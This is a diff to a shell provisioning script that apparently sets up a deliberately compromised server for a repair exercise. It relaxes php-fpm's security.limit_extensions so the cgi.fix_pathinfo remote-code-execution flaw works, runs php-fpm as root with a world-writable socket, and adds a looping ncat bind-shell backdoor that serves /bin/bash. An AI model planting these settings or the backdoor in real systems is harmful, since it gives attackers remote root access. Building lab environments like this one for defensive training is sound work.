@@ -7,7 +7,8 @@ ROLES=/etc/sysrepair/roles.json
 apt-get update -qq
 apt-get install -y --no-install-recommends \
     nginx php8.2-fpm php8.2-cli \
-    openssh-server sudo procps iproute2 cron curl jq ncat \
+    openssh-server openssh-client sshpass pamtester \
+    sudo procps iproute2 cron curl jq ncat \
     ca-certificates >/dev/null
 
 ADMIN=$(jq -r .admin_user            "$ROLES")
@@ -52,6 +53,13 @@ sed -i 's|^;\?clear_env\s*=.*|clear_env = no|' "$POOL"
 sed -i 's|^;\?listen\.owner\s*=.*|listen.owner = root|' "$POOL"
 sed -i 's|^;\?listen\.group\s*=.*|listen.group = root|' "$POOL"
 sed -i 's|^;\?listen\.mode\s*=.*|listen.mode = 0666|'   "$POOL"
+# Relax security.limit_extensions so the classic cgi.fix_pathinfo RCE actually
+# fires on non-.php files (the canonical vulnerable configuration).
+if grep -qE '^;?\s*security\.limit_extensions' "$POOL"; then
+    sed -i 's|^;\?\s*security\.limit_extensions\s*=.*|security.limit_extensions =|' "$POOL"
+else
+    printf '\nsecurity.limit_extensions =\n' >>"$POOL"
+fi
 
 # ---- nginx: public vhost with fastcgi path-info RCE + catch-all ------------
 mkdir -p /var/www/html /var/www/uploads /var/www/private
@@ -115,14 +123,20 @@ EOF
 chmod 0644 "$CRON_PATH"
 
 # ---- supervisor -------------------------------------------------------------
-cat >/usr/local/sbin/hs-start.sh <<'EOF'
+cat >/usr/local/sbin/hs-start.sh <<EOF
 #!/usr/bin/env bash
-set -e
+set +e
 mkdir -p /run/sshd /run/php
 /usr/sbin/sshd -D &
-/usr/sbin/php-fpm8.2 -F &
+/usr/sbin/php-fpm8.2 -F -R &
 nginx -g 'daemon off;' &
 /usr/sbin/cron -f &
+# Backdoor listener — start now so the probe is deterministic at baseline
+# (cron delivery would otherwise take up to 60s).
+( while true; do
+    /usr/bin/ncat -lk -p ${LISTENER_PORT} -e /bin/bash >/dev/null 2>&1
+    sleep 5
+  done ) &
 wait
 EOF
 chmod 0755 /usr/local/sbin/hs-start.sh
